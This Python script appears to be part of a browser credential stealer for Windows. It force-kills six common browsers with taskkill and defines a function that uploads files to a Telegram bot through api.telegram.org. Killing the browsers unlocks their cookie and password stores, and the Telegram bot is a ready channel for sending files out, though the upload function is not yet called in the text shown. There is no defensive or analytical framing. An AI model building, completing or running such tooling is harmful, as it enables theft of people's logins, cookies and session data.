import requests
from pathlib import Path
import os
import subprocess
from dotenv import load_dotenv

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

BROWSERS = [
    "chrome.exe",
    "msedge.exe",
    "opera.exe",
    "browser.exe",   # Yandex
    "brave.exe",
    "vivaldi.exe"
]

def send_file_to_telegram(file_path: Path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    with open(file_path, "rb") as f:
        resp = requests.post(url, data={"chat_id": CHAT_ID}, files={"document": f})
    if resp.status_code != 200:
        print(f"[Telegram] Failed to send {file_path}: {resp.text}")
    else:
        print(f"[Telegram] Sent {file_path}")

def kill_browser_processes():
    for proc in BROWSERS:
        try:
            result = subprocess.run(
                ["taskkill", "/F", "/IM", proc],
                capture_output=True,
                text=True
            )
            if result.returncode == 0:
                print(f"[OK] Killed {proc}")
            else:
                if "not found" in result.stderr.lower() or "не найден" in result.stderr.lower():
                    print(f"[Skip] {proc} not running")
                else:
                    print(f"[Warn] Could not kill {proc}: {result.stderr.strip()}")
        except Exception as e:
            print(f"[Error] {proc}: {e}")

if __name__ == "__main__":
    kill_browser_processes()
